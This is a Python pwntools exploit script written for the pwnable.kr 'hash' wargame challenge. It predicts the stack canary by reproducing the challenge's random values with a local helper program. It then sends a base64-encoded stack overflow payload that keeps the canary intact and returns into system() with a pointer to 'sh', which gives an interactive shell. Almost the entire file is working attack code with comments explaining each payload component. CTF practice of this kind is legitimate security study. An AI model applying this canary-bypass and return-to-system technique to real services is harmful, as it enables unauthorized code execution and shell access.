#!/usr/bin/env python
from pwn import *
import time
import random
import base64

# "sh" in binary as symbols for "get_hash"
sh_addr = 0x8048482

def guess_canary(line):
    # find the hash val
    idx = line.find(":") + 2
    hash_val = int(line[idx:-1])
    print "hash value: " + str(hash_val)
    
    # launch c programs to get random values
    c = process("./rand")
    for i in range(8):
        print c.readline(),
    
    # calculate canary
    l = c.readline()
    idx = l.find(":") + 2
    result = int(l[idx:-1])
    print "result: " + str(result)
    canary = hash_val + result
    print "==> canary: " + str(canary)
    c.close()
    
    return hash_val, canary

def print_menu():
    print r.readline(),
    l = r.readline()
    print l,
    val, canary = guess_canary(l)
    return val, canary

def print_welcome():
    print r.readline(),
    print r.readline(),

#############################
exe = ELF("hash")

r = remote('pwnable.kr', 9002)
#r = process("./hash")

# print menu
hash_value, canary = print_menu()

# for authentication
r.sendline(str(hash_value))

# print welcome
print_welcome()

# find out got addrs
plt_system = exe.plt['system']

# masking from signed to unsigned for p32()
if canary < 0:
    canary = canary & 0xffffffff

# "A" = garbages
# canary = guessed through calculation above
# "B" garbages
# "C" = ebp
# plt_system = ret addr
# "D" = garbages
# sh_addr = addr pointing to "sh", which is part of the symbol in binary (e.g. get_hash())
payload = "A" * (0x200) + \
        p32(canary) + \
        "B" * 8 + "C" * 4 + \
        p32(plt_system) + \
        "D" * 4 + \
        p32(sh_addr)
# encode payload
e_payload = base64.b64encode(payload)

# send paylaod
r.sendline(e_payload)

r.interactive()
